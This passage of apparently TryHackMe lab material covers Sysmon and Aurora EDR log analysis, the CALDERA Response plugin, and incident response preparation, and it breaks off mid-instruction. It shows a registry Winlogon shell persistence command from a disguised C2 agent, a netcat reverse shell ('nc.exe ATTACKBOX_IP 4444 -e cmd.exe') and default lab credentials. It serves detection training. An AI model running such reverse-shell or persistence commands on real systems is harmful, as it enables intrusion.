TimeCreated  : 3/30/2023 2:55:46 PM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName: -
               UtcTime: 2023-03-30 14:55:46.420
               ProcessGuid: {c5d2b969-a2f2-6425-0e01-000000002401}
               ProcessId: 2524
               Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
               FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
               Description: Windows PowerShell
               Product: Microsoft® Windows® Operating System
               Company: Microsoft Corporation
               OriginalFileName: PowerShell.EXE
               CommandLine: powershell.exe -ExecutionPolicy Bypass -C "Set-ItemProperty \"HKLM:\Software\Microsoft\Windows
               NT\CurrentVersion\Winlogon\\\" \"Shell\" \"explorer.exe, C:\Windows\System32\cmd.exe\" -Force"
               CurrentDirectory: C:\Users\Administrator\
               User: VICTIM\Administrator
               LogonGuid: {c5d2b969-7f2f-6425-e708-090000000000}
               LogonId: 0x908E7
               TerminalSessionId: 2
               IntegrityLevel: High
               Hashes: MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160
               AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
               ParentProcessGuid: {c5d2b969-808e-6425-8600-000000002401}
               ParentProcessId: 2832
               ParentImage: C:\Users\Public\chrome.exe
               ParentCommandLine: "C:\Users\Public\chrome.exe" -socket 10.10.150.37:7010 -http http://10.10.150.37:8888
               -contact tcp
               ParentUser: VICTIM\Administrator
PS C:\Tools> Clear-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational"
```

You may have observed three things after executing the `Get-WinEvent` command:

- We used the `fl (Format-List)` cmdlet to list the field values of the logs instead of the default table format.
- The printed logs must be analysed from bottom to top to follow the correct timeline.
- We redacted the File Creation event log of `__PSScriptPolicyTest__` since it is insignificant to our analysis. You may disregard this log entry while doing the analysis.

Don't forget to clear the logs again before proceeding to the following ability.

# PowerSiem

If you prefer analysing the events in real-time while the operation is running, we can use [PowerSiem.ps1](https://github.com/IppSec/PowerSiem). This is a script created by IppSec to print the Sysmon
 logs automatically every second. The script also parses the message 
field, which provides a better view to analyse the log entry.

You may find the script in the tools directory.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\PowerSiem.ps1
```

After executing the PowerShell script, you may continue running the operation to see the logs printed by PowerSiem.

# AuroraEDR

In addition to the events generated by Sysmon, the machine also has a running Aurora EDR Agent. This tool generates logs based on its detections using Sigma rules. You may access the events generated by Aurora EDR via Windows Event Viewer: `Windows Logs > Application`.

To remove the unnecessary events from the current view, you may use the filter and specify the **Source** with **AuroraAgent**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3655ef57f7812ebf35f227b941a93efa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/3655ef57f7812ebf35f227b941a93efa.png)

Now that everything is set, we can start re-executing the operation to review the detections made by Aurora EDR.
 You may need to create a new operation using the same profile to 
execute each ability individually. And again, you may clear the logs 
before proceeding to the following ability.

**Note: Don't forget to refresh the Event Viewer once the ability has been executed.**

For a quick example, let's analyse the detections generated by the `Create a Process using WMI Query and an Encoded Command` ability.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/89f61c754fdae5a36856bef36871d1ce.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/89f61c754fdae5a36856bef36871d1ce.png)

After running the ability, the Event Viewer shows 25 detections made. However, we must remove the `System EventLog Cleared` from the count since it is generated by our clear logs action before the ability's execution.

You
 may navigate to the details tab of each event log to analyse the 
detections. This tab contains all relevant information about the 
detection, such as the details of the Sigma rule that flagged the 
activity and the flagged process details.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/51c2009722729a9895ac79954ebfc7bd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/51c2009722729a9895ac79954ebfc7bd.png)

Upon checking the logs, you may observe that it indicates why the activity is flagged based on the **Match_Strings** field.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e31d8819fb32f0968e29ce83852ab520.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e31d8819fb32f0968e29ce83852ab520.png)

From the image above, the ability was flagged with the `Suspicious PowerShell Parameter Substring` rule due to the following indicators:

- `exec bypass` exists in the CommandLine field.
- `powershell.exe` exists in the Image field.

Reviewing
 the detection details made it easy to understand that the following 
commands above indicate potentially malicious activity.

# Emulation Activity #1 Analysis

Complete the **Emulation Activity #1** profile investigation based on the methodology provided above to answer the questions below.

**Autonomous Incident Response**

Continuing
 our pursuit to leverage CALDERA from the perspective of a blue teamer, 
let's discover the features of the framework built for detection and 
response. We will focus on CALDERA's Autonomous Incident Response use 
case for this task.

To start with, you need to logout your current CALDERA web access and use these credentials to log in as the blue user:

Username: `blue`

Password: `admin`

After
 successfully logging in, you may observe that the theme of the web 
application is now blue, and one of the tabs in the campaign sidebar has
 changed from adversaries to defenders.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e1571464c2262d24fef449cfda47acb9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e1571464c2262d24fef449cfda47acb9.png)

Before proceeding, here is an overview of the topics that will be discussed in this task:

1. Introduction to the Response plugin.
2. Sources and Facts.
3. Incident Response Scenario
4. Running blue operations and reviewing results.

# Introduction to the Response Plugin

The
 Response plugin is the counterpart of the threat emulation plugins of 
CALDERA. It mainly contains abilities that focus on detection and 
response actions. You may view the summary of the response plugin by 
navigating to the response tab in the sidebar.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c3f1c064a7a406bdbb41b4a1846cdc37.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c3f1c064a7a406bdbb41b4a1846cdc37.png)

In
 the version of CALDERA used in this task, there are currently 
thirty-seven abilities and four defenders. As mentioned above, defenders
 are the counterpart of adversaries, which means these are the blue team
 profiles that contain abilities that execute detection and response 
actions. The current defenders available in this version are the 
following:

- Incident Responder
- Elastic Hunter
- Query Sysmon
- Task Hunter

We will detail more about these defender profiles in the succeeding sections.

# Response Plugin Abilities

You
 may view the abilities available for the plugin by navigating to the 
abilities tab and filtering it with the response plugin, similar to the 
image below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/75c53f231d6e0262b513bb96e9db848d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/75c53f231d6e0262b513bb96e9db848d.png)

Compared to the adversaries' abilities that are mapped with MITRE ATT&CK Tactics and Techniques, the Response Plugin Abilities are classified by four different tactics, such as:

- Setup - Abilities that prepare information, such as baselines, that assists other abilities in determining outliers.
- Detect - Abilities that focus on finding suspicious behaviour by continuously
acquiring information. Abilities under this tactic have the Repeatable
field configured, meaning they will run and hunt as long as the
operation runs.
- Response - Abilities that act on behalf of the user to initiate actions, such as
killing a process, modifying firewall rules, or deleting a file.
- Hunt - Abilities that focus on searching for malicious Indicators of Compromise (IOCs) via logs or file hashes.

# Defender Profiles

As
 previously mentioned, four defender profiles are currently installed at
 the blue teamers’ disposal. For this task, we will only focus on the **Incident Responder** profile. This profile contains abilities under three different tactics **(detection, hunt, response)**, making it a good example compared to the others.

To view this profile, navigate to the **defenders** tab from the sidebar and use the search functionality to display the abilities connected to it.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/79e11859bb090cd0e6a3d012589f7b14.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/79e11859bb090cd0e6a3d012589f7b14.png)

Upon checking the profile, you may observe that some abilities are connected. Try to hover over the `Find unauthorized processes` ability; you will see that it also highlights the `Enable Outbound TCP/UDP firewall rule`
 ability. This means that these two abilities may unlock or require a 
value for each other to execute their commands successfully.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/821f60ecd1200766fd34150874923cd8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/821f60ecd1200766fd34150874923cd8.png)

Given the two abilities, you may see that the `Find unauthorized processes` ability unlocks the `remote.port.unauthorized` value, while the  `Enable Outbound TCP/UDP firewall rule` ability requires the same value to execute blocking unauthorized network connections successfully.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6fc916e7fea4cabd8696ce7ea020f084.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6fc916e7fea4cabd8696ce7ea020f084.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a1a7e4511dd098a42a4b82b0dcb24e91.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a1a7e4511dd098a42a4b82b0dcb24e91.png)

To
 understand the profile better, hover over other abilities to see the 
connection of each one. You will see that the following abilities are 
connected:

- `Find unauthorized processes` > `Enable Outbound TCP/UDP firewall rule`
- `Find atypical open ports` > `Kill Rouge Process`
- `Hunt for known suspicious files` > `Delete known suspicious files`

Once
 you execute this profile in the following instructions, you will see 
that the abilities that require a value do not execute until the 
prerequisite abilities have gathered the data. This makes sense since 
the prerequisite abilities are under the detection tactic, and the 
abilities that require value are under the response tactic. You cannot 
automate the response without appropriately detecting suspicious 
activity.

# Reviewing Abilities

It
 is also essential to review the commands executed by each ability. This
 gives us a better understanding of its purpose and the implementation 
of automated detection or response actions.

For this exercise, let's focus on checking the values of the `Find unauthorized processes` ability. You may click this ability to view its configuration.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b1a374fd36ba549020318c6c5317948e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b1a374fd36ba549020318c6c5317948e.png)

You
 may observe that the Repeatable field is checked, which means the 
configuration will continuously run until the operation ends.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fb2b8ac803235ab1f4d5bbb82ea0a73f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/fb2b8ac803235ab1f4d5bbb82ea0a73f.png)

Now, scroll down to the executor that runs on a Windows platform and uses PowerShell to execute the commands.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6f10f228b415c1966ff582759e786aaa.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6f10f228b415c1966ff582759e786aaa.png)

The command attempts to look for TCP
 connections with a specific outbound port and returns the process that 
initiated the network connection. You may see that it uses the `remote.port.unauthorized` value for the `-RemotePort` parameter. However, this ability does not require any prerequisite abilities before its execution, which means it uses a **fact** preconfigured in our CALDERA instance. Let's detail the information about this in the next section.

# Sources and Facts

As mentioned above, one of the abilities is using a fact during an operation. Let's discuss first what Sources and Facts are.

- **Facts** are identifiable pieces of data. May it be acquired by agents during
the execution of abilities or loaded from preconfigured settings.
- **Sources** are groups of facts. You have already encountered configuring sources while creating an operation, but we only used the **basic** source previously. Now, let's discuss the default source for the Response plugin, which is the **response** source.

Please navigate to the **fact sources**
 tab from the lower part of the sidebar and filter the view with the 
response source by selecting it above the Create Source button. You will
 see that the `remote.port.unauthorized` fact is seen in this source and has the following values: **7010**, **7011** and **7012**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0b02b1ce9209cf2809e0b3b1975cffa9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0b02b1ce9209cf2809e0b3b1975cffa9.png)

These facts can be configured based on your detection needs, such as adding a new port in the `remote.port.unauthorized` fact or adding a new search path in the `file.search.directory`
 fact. The image below shows that we consider port 4444 an unauthorized 
remote port. Don't forget to click the save button to apply the changes.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/58729054723513d25593f962b79dab21.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/58729054723513d25593f962b79dab21.png)

The
 usage of this fact makes the operation execute the ability four times, 
one for each port. A sample command snippet below summarises what 
commands are being run by the `Find unauthorized processes` ability during an operation.

```powershell
Get-NetTCPConnection -RemotePort "7010" -EA silentlycontinue | where-object { write-host $_.OwningProcess }
```

```powershell
Get-NetTCPConnection -RemotePort "7011" -EA silentlycontinue | where-object { write-host $_.OwningProcess }
```

```powershell
Get-NetTCPConnection -RemotePort "7012" -EA silentlycontinue | where-object { write-host $_.OwningProcess }
```

```powershell
Get-NetTCPConnection -RemotePort "4444" -EA silentlycontinue | where-object { write-host $_.OwningProcess }
```

# Incident Response Scenario

Now
 that we have discussed the required knowledge to understand how the 
response plugin works, let's simulate a simple Incident Response 
scenario to trigger some of the abilities included in the **Incident Responder** profile.

Since
 we aim to utilise the Incident Responder profile, we will establish a 
reverse shell from our victim machine to our AttackBox instance. Note 
that in the next terminal snippets, the blue terminal pertains to 
commands for the victim machine, and the black terminal is for the 
AttackBox.

First, set up a Netcat listener in the AttackBox by executing the following commands.

ubuntu@tryhackme: ~/

```
ubuntu@tryhackme:~$ nc -lvp 4444 -s $(hostname -I | awk '{print $1}')
```

Our next step is to execute a reverse shell in our victim machine. 
Navigate to the Tools directory and run the following commands.

Administrator: Windows PowerShell

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\nc.exe ATTACKBOX_IP 4444 -e cmd.exe
```

**Note: You must replace the ATTACKBOX_IP with your current AttackBox IP address.**

Once the reverse shell is established, you will see in your AttackBox that a cmd shell is now accessible.

ubuntu@tryhackme: ~/

```
ubuntu@tryhackme:~$ nc -lvp 4444 -s $(hostname -I)Listening on ip-10-10-150-37.eu-west-1.compute.internal 8080

Connection received on ip-10-10-120-9.eu-west-1.compute.internal 49734
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Tools>
```

Now, what's left is to execute the operation and observe the behaviour of the profile.

# Running Blue Operations

Before running an operation, we need to deploy a new blue agent in our victim machine. Navigate to the **agents** tab and click **Deploy an agent**. Select **Sandcat** as your agent and replace the IP values with your AttackBox's IP address.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f7c3a27781f069ff8539f4be9ce561ee.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f7c3a27781f069ff8539f4be9ce561ee.png)

Then
 scroll down to the variations, select the commands for the deployment 
of the blue agent and execute it in the victim machine.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ec226492e89cec4881d5b16b50bbfd33.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ec226492e89cec4881d5b16b50bbfd33.png)

Now that we have created a new agent, let's continue executing the Incident Responder profile.

Like how we created red operations, you can create a blue operation by navigating to the **operations** tab and clicking **Create Operation**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/76684c0b0fa751cdb4023a809e657691.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/76684c0b0fa751cdb4023a809e657691.png)

Note
 that the configuration of red operations we learned from the previous 
tasks differs from blue. Before starting the operation, we need to set 
the following changes:

- Set the **Adversary (Defender)** field to **Incident Responder**.
- Set the **Fact Source** to **response** (this will use the source we discussed above).
- Set the **Group** to **blue** (this prevents execution to red agents).
- Set the **Planner** to **batch** (the only option for profiles that contain abilities with the Repeatable field set to true).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6f22a73139f9a1afc98ad6d29661090f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/6f22a73139f9a1afc98ad6d29661090f.png)

After configuring the operation, start and review the results to answer the questions below.

## **INCIDENT RESPONSE**

## **Preparation**

# Incident Response Debrief

Knowing that we are tackling the incident response process in this
room, you are expected to be familiar with the fact that
incident response is usually coupled with digital forensics concepts. **Incident response, also known as incident
handling**, is a cyber security function that uses various
methodologies, tools and techniques to detect and manage adversarial
attacks while minimising impact, recovery time and total operating
costs. Addressing attacks requires containing malware infections,
identifying and remediating vulnerabilities, as well as sourcing, managing, and
deploying technical and non-technical personnel.

Setting up an incident response capability requires organisations to
make several decisions, including having a specific definition for the
term "incident" to fit a clear scope. Therefore, we can differentiate
events and incidents as the following:

- **Event:** This is an observed occurrence within a
system or network. It ranges from a user connecting to a file server, a
user sending emails, or anti-malware software blocking an
infection.
- **Incident:** This is a violation of security
policies or practices by an adversary to negatively affect the
organisation through actions such as exfiltrating data, encrypting through ransomware, or causing a denial of services.

# The Incident Response Process

As an overview, we shall look at the IR process below. This process
is meant to serve as a roadmap for incident responders, allowing them to
adapt as they progress through their investigations and mitigations.

The remainder of the room will cover the first phase, **Preparation**,
while the rest will be tackled in follow-up rooms.

The notable IR process consists of the following phases:

- **Preparation**: Ensures that the organisation can
effectively react to a breach with laid down procedures.
- **Identification**: Operational deviations must be
noted and determined to cause adverse effects.
- **Analysis or Scoping:** The organisation determines the extent of a security incident, including
identifying the affected systems, the type of data at risk, and the
potential impact on the organisation.
- **Containment**: Damage limitation is paramount, therefore, isolating affected systems and preserving forensic evidence is required.
- **Eradication**: Adversarial artefacts and techniques
will be removed, restoring affected systems.
- **Recovery &** **Lessons Learned**: Business operations are to resume fully
after removing all threats and restoring systems to full function. Additionally, the organisation considers the
experience, updates its response capabilities, and conducts updated
training based on the incident.

# Need for Incident Response Plan

Incident response capability benefits from organising response
processes into a consistent methodology. Additionally, the information
gathered during the process would strengthen defences against future
attacks on systems and data. This is where an incident response plan
comes into play.

An **incident response plan (IRP)**
 is a document
that outlines the steps an organisation will take to respond to an 
incident. The IRP should be the organisation's Swiss Army knife,
comprehensively covering all aspects of the incident response process,
roles and responsibilities, communication channels between stakeholders,
 and metrics to capture the effectiveness of the IR process.

To have an effective incident response plan, you would have gone
through numerous iteration processes via creating templates and
refactoring the process. This ensures that you can ingest incident data
and mitigate breaches as they occur accurately. The templates would also
be valuable in creating incident reports.

Accompanying an incident response plan is the use of playbooks. The
playbooks would provide the organisation with actions and procedures to
identify, contain, eradicate, recover and track successful incident
mitigation measures.

**People and Documentation Preparation**

As we begin looking at the first phase, it is essential to know that
the purpose of preparation in incident handling is to ensure that your
team and organisation are ready to handle and recover from incidents.
Numerous elements should be covered during the **Preparation** phase,
including people, policy, technology, communication and
documentation.

# Preparing The People

It is highly known that the easiest and most accessible attack point
for any organisation is its people. Your employees and teammates are
adversarial targets, mainly through social engineering and phishing
tactics. Therefore, preparing your team effectively to recognise and
address incidents before, during, and after is essential.

### Creation of CSIRT Teams

You must create a cyber security
incident response team (CSIRT) that includes business, technical, legal
counsel, and public relations experts with relevant skills and authority
to act upon decisions during a cyber attack. Following the team's
creation, the members will require appropriate permissions under a
well-established access control policy. This access must be well
organised and controlled, with proper notifications to system
administrators when the CSIRT uses privileged access.

### Training & Assessment Sessions

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/7732fdca43cf84ebbad796cf638179cb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/7732fdca43cf84ebbad796cf638179cb.png)

As we have identified some ways attackers target people, the most
effective way to ensure they are well-equipped with knowledge about
these attacks is through constant training, assessment, and awareness
sessions. Conducting social engineering campaigns, testing user
susceptibility towards spear phishing attacks, and providing current
affairs training will be crucial towards preparing your team.

This training also applies to your end users and customers, who would
act as your sensors and alert sources when they pick up anything
suspicious happening on their end. In this case, training content like
the [Phishing Analysis Module](https://tryhackme.com/module/phishing) we provide would be vital to internal and
external stakeholders to know how to detect and respond to phishing
attacks.

Additionally, incident handlers must be familiar with forensic
imaging tools, how to read audit logs, and performing analysis using
honeypots and vulnerable systems. This will allow them to identify
suspicious events when they occur and can conduct practical forensics
when the need arises.

## Preparing The Documentation

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/b869969e2069706db3660e9a8cd6f28b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/b869969e2069706db3660e9a8cd6f28b.png)

Incident documentation would be a lifesaver for an organisation. The
information gathered could be used as evidence in a criminal cyber
attack or instrumental in developing mitigation plans, and lessons
learned assessments. This means that incident responders need to develop
note-taking and detail-oriented skills.

### Policies

Defining principles and guidelines for security processes is vital
while conducting your preparation. This ensures that techniques are
well-known towards handling an incident. The policies need to be visible
to employees, users and other stakeholders, for example, through warning
banners, which would inform on the prohibition of unauthorised
activities and limit the presumption of privacy within the
organisation.

Additionally, the policies should outline the organisation's
authority towards monitoring the network and all the systems under its
roof. Policies would need to be reviewed by a legal team and aligned to
local privacy laws and regulations.

### Communication Plan & Chain of Custody

Accompanying the policies would be a 
communication plan outlining who
within the CSIRT team should be the point of contact and what procedures
should be followed. For example, the CSIRT may have operations members
who are always on call to receive reports on suspected incidents. These 
reports should trigger a chain of actions, including when to notify
law enforcement, media personnel, or third parties. Additionally, the
team would keep track of the flow of information and manage evidence
forms and documents, such as the chain of custody documents. These 
documents are meant to track the flow of information, evidence handling 
and reporting when addressing any incident. A template of such a 
document can be downloaded from this task above.

### Response Procedures

Incident handling should be viewed as an organisational operation,
ensuring every member has a role to avert damages and revert to normal
operations. This means that default procedures need to be defined and
approved by management. Effectiveness and timeliness are crucial when
security defences have been breached; thus, orderly processes would
determine the nature of handling breaches.

### **Technology Preparation**

The people and policies set up by the CSIRT would require the backing
of tools and solutions to protect and defend their organisation's
technological infrastructure. Any incident response operation involves
the organisation of devices, systems, and technologies that will
facilitate the prevention, detection, and mitigation of any occurrence.
As a result, knowing your technical infrastructure is essential to the
incident response process.

# Asset Inventory Classification

It is crucial to identify high-value assets within the organisation,
together with their technical composition. This will comprise the
infrastructure, intellectual property, client and employee data, and
brand reputation. Protecting these assets ensures that the
confidentiality, integrity, and availability of the organisation's services, data, and
processes are intact, which also helps maintain credibility.
Additionally, the asset classification will be helpful for the
prioritisation of protective and detective measures for the assets.

An example of an inventory list would be as follows. Do take note
that it is advisable to have hardware and software inventory lists for
proper tracking.

| Asset Type | Asset Name | Operating System | Asset IP Address |
| --- | --- | --- | --- |
| Mail Server | MailSrvr1 | Windows Server 2019 | 192.168.0.2 |
| Web Server | WebSrvr1 | Ubuntu Server 20.04 | 192.168.0.3 |
| VPN Server | VPN1 | Ubuntu Server 20.04 | 192.168.0.4 |
| Software | THM_MathBooks |  |  |
| Software | TruckFinder |  |  |

# Technical Instrumentation

Once the inventory has been identified, this 
should be followed up
with telemetry about the network infrastructure, which is essential for
incident response. This means mapping every network device, cloud
platform, system, and application. Having this infrastructural picture 
simplifies the implementation of system and sensor-based detection 
mechanisms. These mechanisms include anti-malware, endpoint detection 
and response (EDR) tools, data loss prevention (DLP), intrusion detection and prevention systems (IDPS), and log collection capabilities.

One key aspect of the telemetry collection is network subnetting.
This is a means of logically grouping network devices and IPs with
specific access and usage permissions and policies, utilising firewalls,
demilitarised zones, and IP segmentation. These telemetry and incident details can be collected and tracked using tools like [TheHive Project](https://tryhackme.com/room/thehiveproject). However, note that TheHive may have been updated since the release of the room.

![https://docs.strangebee.com/assets/images/hero-thehive.png](https://docs.strangebee.com/assets/images/hero-thehive.png)

# Investigation Capabilities

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/a7845f2528c371de4974e2b8641fc2e0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/a7845f2528c371de4974e2b8641fc2e0.png)

To conduct any investigations during an attack or breach, incident
responders must ensure they can validate executing scripts and
installers on all endpoints and hosts within their network and implement
technical capabilities to facilitate attack containment, analysis, and 
replication. There should be means of collecting forensic evidence using
 disk and memory imaging tools, secure storage only accessible to the 
CSIRT, and analysis tools such as sandboxes. Accompanying these efforts 
should be an incident-handling **jump bag**. This bag contains all the necessary tools for incident
response. Each kit will be unique; however, as an incident responder,
the following items are worth having in your arsenal:

- Media drives to store evidence being collected.
- Disk imaging and host forensic software such as FTK Imager,
EnCase, and The Sleuth Kit.
- Network tap to mirror and monitor traffic.
- Cables and adapters such as USB, SATA, and card readers to
accommodate common scenarios.
- PC repair kits that include screwdriver sets and tweezers.
- Copies of incident response forms and communication playbooks.

**Visibility**

After setting up the people, processes, and technology checks for your
incident response effort, you must know what is happening within your
organisation's digital assets. This ensures that you avoid digital
obliviousness by having visibility across the network.

What does visibility entail? Visibility covers collecting
audit and logs data, monitoring threat intelligence feeds on emerging
adversarial tactics, techniques, and procedures (TTPs) and ingesting
vendor patch advisories. These information sources allow the
organisation to detect, identify, assess, alert, and mitigate
unauthorised and abnormal activity within the network. Internal
visibility revolves around log management, and having
maximum coverage should be part of the cyber resilience and incident
handling strategies. In contrast, external visibility entails being aware of
what is happening within the community and the threat landscape.

Knowing the benefits that visibility will provide within the
incident-handling process is essential. The following are a few of the
benefits:

- Provides factual information about access to resources, time of
access, and who conducted the activity.
- Visibility through log management can help improve the effectiveness
of processes, policies, and procedures.
- With log data collected, incidents can be handled using concrete
evidence.
- Compliance with regulations is made to be easier with the collection
of log data.
- Keeps you up-to-date with emerging threats, TTPs, and
signatures.
- Ensures that systems are patched up regularly.

# Visibility via Logs

Every computing device within an organisation's network can
generate and store logs. The challenge of aggregating the logs is addressed by using [Security Information Event Management (SIEM)](https://tryhackme.com/room/introtosiem)
solutions, which provide a central storage and analysis platform. Logs
must be secured from any modification once recorded. Additionally, as a
CSIRT team member, you should be aware that the collection of logs
enables the other stages of the incident response process to run as
smoothly as possible.

Common types of log entries to enable and monitor include:

- **Event:** These logs record information about a system
or network occurrence, such as login attempts, application events and
network traffic.
- **Audit:** These cover a sequential recording of
activities within a system by capturing who performed an action, what
activity was initiated, and how the system responded. There are two
classes of audit logs: **Success** and **Failure**.
- **Error:** When a problem occurs within a system, such
as service failure, the events would be recorded as error logs.
- **Debug:** During the testing of systems and services, debug logs are recorded to help find problems
and facilitate troubleshooting.

The log entries would be sourced from various avenues within an
organisation's infrastructure. Some familiar sources of logs
include:

- **Network logs:** These are mainly collected from
network devices such as switches and routers and through packet capture
solutions.
- **Host perimeter logs:** These are mainly facilitated
by firewalls, proxies, and VPN servers. They contain information about
allowed and denied actions transmitted to the organisation's host
devices.
- **System logs:** These logs record events and services
being run by the operating system.
- **Application logs:** These are logs collected from the
applications being run internally. They may include web applications,
cloud services, databases and proprietary tools.

# Setting up Visibility

Before we dive into the contents of setting up visibility, start the virtual machine by clicking on the green "**Start Machine"** button on the upper-right section of this task. Give it about **4 minutes** to load up in Split View fully. If the machine doesn't appear, press the blue **"Show Split View"** button on the top-right of this room.

As we have identified the sources and types of logs to be collected,
the CSIRT has to develop procedures and plans for setting up the right
tools and configuration policies within systems outlined in the asset
inventory to collect and aggregate all the necessary logs. On Windows
systems, security policies can be configured via local or group policy
management, with the latter being used for multiple systems under an
Active Directory.

Let us look at an example of setting up the policies for Interactive
Logon sessions which have yet to be defined, as you can see below. Once the VM has loaded up, open the **Windows Administrative Tools** via the **Start Menu** and find the **Local Security Policy** settings. We can then navigate to the following policy: `Security
 Settings -> Local Policies -> Security Options -> Interactive 
logon: Display user information when the session is locked.`

Once here, you will find that the policy: **Interactive logon:
Display user information when the session is locked** has not been
defined. This policy aims to set the standard of whether to show user
login identities, such as username, domain account, and email, when their
session is locked. For sensitive systems, such as those used by the
Finance or Human Resource departments, it is recommended to set this
policy to the option that does not display any user information to
prevent malicious actors from knowing whose credentials were last
used.

What about the events taking place within the systems? Do these need logging and visibility?

You can pivot to the linked room to uncover more about [Windows Event Logs](https://tryhackme.com/room/windowseventlogs); however, looking at our
scenario, you find out that the organisation did not implement Windows Event monitoring.

The network systems have event
logging disabled, which is integral to ensuring visibility, as
adversaries may take advantage of this situation to cause havoc. So, how
do you resolve this?

The first thing to check is the current situation via the Event
Viewer. Open the **Event Viewer** pinned on the Taskbar, and you will be welcomed with a warning banner informing you that the Event Log service is
unavailable. This means that the registry records for the service have
been modified and need to be changed to enable it.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5d048288077c5f33c2015a5cf7b220f5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5d048288077c5f33c2015a5cf7b220f5.png)

Navigating through the Registry via:`Windows Administrative Tools -> Registry Editor -> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\start`.
 You will find that the registry key value is set to 4, which needs to 
be set to 2, representing putting the service into automatic startup 
mode. Modify the registry and reboot the system for the changes to take 
effect, which should take 3 minutes.

Once the system has been rebooted, you can 
open the Windows Event Viewer and confirm it works. We can test that the
 system is recording logs by using some Atomic Red Team tests, which 
have already been downloaded and installed, to simulate an incident. 
Open a PowerShell session and run the following commands:

